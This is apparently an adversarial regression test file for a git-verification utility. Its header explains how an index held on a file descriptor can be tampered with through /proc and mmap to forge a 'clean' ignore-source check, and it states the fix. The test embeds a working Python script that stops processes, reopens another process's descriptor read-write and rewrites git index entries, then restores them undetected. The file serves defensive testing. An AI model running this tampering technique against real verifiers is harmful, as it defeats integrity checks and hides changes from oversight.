/*
RFC-1616 round-34 independent adversarial probe — candidate commit
0245bf867, exported tree.

CX-r34-F — `evidenceAnchoredGit(add)`'s ignore-provenance conjunct
(:4991-4995): `provenSource(src) = src.endsWith(".gitignore") ∧
(pinned.has(abs) || (ruleSources.has(abs) && clean.has(src)))`.
`ruleSources` is now `enumerateTrackedRuleSources`'s in-process
filter of the minted `names` — attacker reach is the real index at
mint (stage the source, it is enumerated). `clean` is the residual
guard: one `runClaims` `status --porcelain -z -- <srcNames>` child
(:4975-4990) on the CLAIMS fd must not report the source as
worktree-divergent.

That `status` child is the same armed-window claims-fd consult —
the mmap(MAP_SHARED) flip→restore primitive is invisible to both
the fd watch and `claimsFdPin`:

  1. Stage `x/.gitignore` into the real index with blob B
     (`update-index --add --cacheinfo`); the WORKTREE file carries
     DIFFERENT bytes C = "hidden\n" — a tracked-in-claims source
     whose committed-bytes-vs-consulted-bytes differ exactly as a
     post-stage worktree rewrite would.
  2. `add -A -- .` honestly drops `x/hidden` — worktree rule C
     ignores it → residual `x/hidden` cited to `x/.gitignore`.
  3. srcNames includes `x/.gitignore` (it is in names); the `status`
     child on the honest claims image reports ` M x/.gitignore`
     (B ≠ C) → `clean` misses it → provenSource false →
     "add dropped x/hidden under an unattested ignore source" →
     REFUSE. That is the honest verdict the attack must defeat.
  4. The hijacker freezes the `status` child pre-read, mmap()s the
     claims fd MAP_SHARED, rewrites the entry's OID in place —
     B → hash(C) — same size, zero inotify events → `status` sees
     index-oid == worktree bytes → ` M` gone → clean has it →
     proven → residual justified → `add` exits 0 while `x/hidden`
     stays untracked under a source the claims index never
     attested as clean.
  5. Restore through the same mapping before settle — claimsFdPin
     sees minted bytes → coverage passes.

Honest outcomes: refused = exitCode -1 (EVIDENCE-REFUSED); honest =
`add` fails or `x/hidden` correctly staged/kept-unignored; forged =
`add` exits 0 with `x/hidden` unstaged (dropped by unattested
rules) — the staged set is NOT what the caller's pathspec covered.

Fix: the held index is `fchmod`ed `0400` at mint — the O_RDWR
`/proc/<vpid>/fd` open the flip needs is EACCES, and the `chmodat`
reopen escape bumps ctime into the `ctimeNs` pin (fsync-flushed at
settle) plus an armed-window event.
*/

import { execFileSync, spawn, spawnSync } from "node:child_process";
import { constants as fsConstants, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { evidenceAnchoredGit, evidenceRepoPreflight } from "../../../src/utils/verifier-git.ts";

(fsConstants as { O_TMPFILE?: number }).O_TMPFILE = 0o20200000;

const tmpdirs: string[] = [];
afterEach(() => {
  while (tmpdirs.length > 0) rmSync(tmpdirs.pop()!, { recursive: true, force: true });
});

const git = (root: string, args: string[], input?: string) =>
  execFileSync("git", ["-C", root, ...args], { encoding: "utf8", input }).trim();

const HAS_PY = spawnSync("python3", ["--version"]).status === 0;

/**
 * Freeze the claims `status --porcelain` child on first /proc
 * sight; mmap the claims fd MAP_SHARED; rewrite `x/.gitignore`'s
 * OID to the worktree-bytes blob so ` M` disappears; restore on
 * child exit while the verifier is frozen.
 */
const startStatusFlip = (vpid: number, cleanOidHex: string, secs = 60, logPath?: string) => {
  const script =
    "import os,sys,time,struct,hashlib,mmap\n" +
    "vpid=int(sys.argv[1]); mark=b'x/.gitignore'; doid=bytes.fromhex(sys.argv[2]); end=time.time()+float(sys.argv[3]); log=open(sys.argv[4],'a')\n" +
    "me=str(os.getpid()); flipped=False; restored=False; orig=None; tm=None; t0=time.time()\n" +
    "def lg(m): log.write('%.1f %s\\n'%((time.time()-t0)*1000,m)); log.flush()\n" +
    "def kids():\n" +
    "    out=[]\n" +
    "    try:\n" +
    "        for t in os.listdir('/proc/%s/task'%vpid):\n" +
    "            try: out += open('/proc/%s/task/%s/children'%(vpid,t)).read().split()\n" +
    "            except: pass\n" +
    "    except: pass\n" +
    "    return out\n" +
    "def argv(k):\n" +
    "    try: return open('/proc/%s/cmdline'%k,'rb').read().split(b'\\0')\n" +
    "    except: return []\n" +
    "def rewrite(body):\n" +
    "    n=struct.unpack('>I',body[8:12])[0]; off=12\n" +
    "    for i in range(n):\n" +
    "        nlen=struct.unpack('>H',body[off+60:off+62])[0]&0xFFF\n" +
    "        name=body[off+62:off+62+nlen]\n" +
    "        if name==mark:\n" +
    "            b=bytearray(body)\n" +
    "            b[off+40:off+60]=doid\n" +
    "            body=bytes(b)\n" +
    "            return body[:-20]+hashlib.sha1(body[:-20]).digest()\n" +
    "        off+=(62+nlen+8)//8*8\n" +
    "    return body\n" +
    "def findfd():\n" +
    "    try: names=os.listdir('/proc/%s/fd'%vpid)\n" +
    "    except: return None\n" +
    "    for n in names:\n" +
    "        try:\n" +
    "            if '(deleted)' not in os.readlink('/proc/%s/fd/%s'%(vpid,n)): continue\n" +
    "            os.chmod('/proc/%s/fd/%s'%(vpid,n),0o600)\n" +
    "            f=os.open('/proc/%s/fd/%s'%(vpid,n), os.O_RDWR)\n" +
    "        except: continue\n" +
    "        try:\n" +
    "            if os.pread(f,4,0)!=b'DIRC': os.close(f); continue\n" +
    "            # claims fd = serializeIndexClaims output (ZEROED stat\n" +
    "            # block, offset 12..19 of first entry); the liveIndex fd\n" +
    "            # also contains the mark but carries a REAL stat block.\n" +
    "            if os.pread(f,4,12)!=b'\\0\\0\\0\\0': os.close(f); continue\n" +
    "            sz=os.fstat(f).st_size\n" +
    "            if mark in os.pread(f,sz,0): return f\n" +
    "            os.close(f)\n" +
    "        except: continue\n" +
    "    return None\n" +
    "while time.time()<end and not restored:\n" +
    "    for k in kids():\n" +
    "        if k==me: continue\n" +
    "        av=argv(k)\n" +
    "        if b'status' in av:\n" +
    "            try: os.kill(int(k),19)\n" +
    "            except: continue\n" +
    "            try: os.kill(vpid,19)\n" +
    "            except: pass\n" +
    "            f=findfd()\n" +
    "            if f is not None:\n" +
    "                try:\n" +
    "                    sz=os.fstat(f).st_size\n" +
    "                    m=mmap.mmap(f,sz)\n" +
    "                    orig=m[:]\n" +
    "                    img=rewrite(orig)\n" +
    "                    m[:]=img\n" +
    "                    tm=(f,m); flipped=True; lg('flipped child=%s sz=%d'%(k,sz))\n" +
    "                except Exception as e:\n" +
    "                    lg('fliperr %s'%e)\n" +
    "                    try: os.close(f)\n" +
    "                    except: pass\n" +
    "            try: os.kill(int(k),18)\n" +
    "            except: pass\n" +
    "            if flipped:\n" +
    "                for _ in range(120000):\n" +
    "                    try:\n" +
    "                        stt=open('/proc/%s/stat'%k).read().rsplit(')',1)[1].split()[0]\n" +
    "                        if stt=='Z': break\n" +
    "                    except: break\n" +
    "                    time.sleep(0.00005)\n" +
    "                try: os.kill(vpid,19)\n" +
    "                except: pass\n" +
    "                try:\n" +
    "                    tm[1][:]=orig\n" +
    "                    restored=True; lg('restored')\n" +
    "                except Exception as e: lg('restoreerr %s'%e)\n" +
    "                try: os.kill(vpid,18)\n" +
    "                except: pass\n" +
    "            else:\n" +
    "                try: os.kill(vpid,18)\n" +
    "                except: pass\n" +
    "            break\n" +
    "    time.sleep(0.00002)\n" +
    "lg('exit flipped=%s restored=%s'%(flipped,restored))\n";
  const child = spawn(
    "python3",
    ["-c", script, String(vpid), cleanOidHex, String(secs), logPath ?? "/tmp/cx34f-trace.txt"],
    { stdio: "ignore" },
  );
  child.unref();
  return {
    stop: () => {
      try {
        child.kill("SIGKILL");
      } catch {
        /* done */
      }
    },
  };
};

describe("CX-r34-F: claims-fd mmap flip on the `status` conjunct child fabricates `clean` — anchored `add` silently drops the ignored residual", () => {
  it(
    "forged `clean` proves the worktree-only rule — `add` exits 0 with `x/hidden` unstaged",
    { timeout: 300_000 },
    async (ctx) => {
      if (!HAS_PY) return ctx.skip();
      let forged = 0;
      let refused = 0;
      let honest = 0;
      let lastErr = "";
      for (let attempt = 0; attempt < 30; attempt++) {
        const root = mkdtempSync(path.join(os.tmpdir(), "cx34f-"));
        tmpdirs.push(root);
        execFileSync("git", ["init", "-q", "-b", "main", root]);
        git(root, ["config", "user.email", "t@t"]);
        git(root, ["config", "user.name", "t"]);
        writeFileSync(path.join(root, "f.txt"), "v1\n");
        git(root, ["add", "f.txt"]);
        git(root, ["commit", "-qm", "c1"]);
        execFileSync("mkdir", ["-p", path.join(root, "x")]);
        // Worktree rule bytes C — what `add` actually consults.
        writeFileSync(path.join(root, "x", ".gitignore"), "hidden\n");
        // Claims-staged bytes B ≠ C — the pre-op intent the verifier
        // believes the rule carries.
        const stagedBlob = git(root, ["hash-object", "-w", "--stdin"], "OTHER\n");
        git(root, ["update-index", "--add", "--cacheinfo", `100644,${stagedBlob},x/.gitignore`]);
        writeFileSync(path.join(root, "x", "hidden"), "x\n");
        const cleanOid = git(root, ["hash-object", "-w", "--stdin"], "hidden\n");
        const log = `/tmp/cx34f-trace-${attempt}.txt`;
        const hijack = startStatusFlip(process.pid, cleanOid, 60, log);
        try {
          const pre = await evidenceRepoPreflight(root);
          expect(pre).not.toBeNull();
          const r = await evidenceAnchoredGit(root, ["add", "-A", "--", "."], {
            preflight: pre!,
          });
          if (r.exitCode === -1) {
            refused++;
            lastErr = r.stderr.slice(0, 160);
          } else if (r.exitCode === 0) {
            let stagedHidden = true;
            try {
              git(root, ["rev-parse", ":x/hidden"]);
            } catch {
              stagedHidden = false;
            }
            if (stagedHidden) honest++;
            else forged++;
          } else {
            honest++;
          }
        } finally {
          hijack.stop();
        }
      }
      console.log(
        `claims-fd mmap flip on runClaims status (anchored add provenance): forged=${forged} refused=${refused} honest=${honest} last=${lastErr}`,
      );
      expect(forged).toBe(0);
    },
  );
});
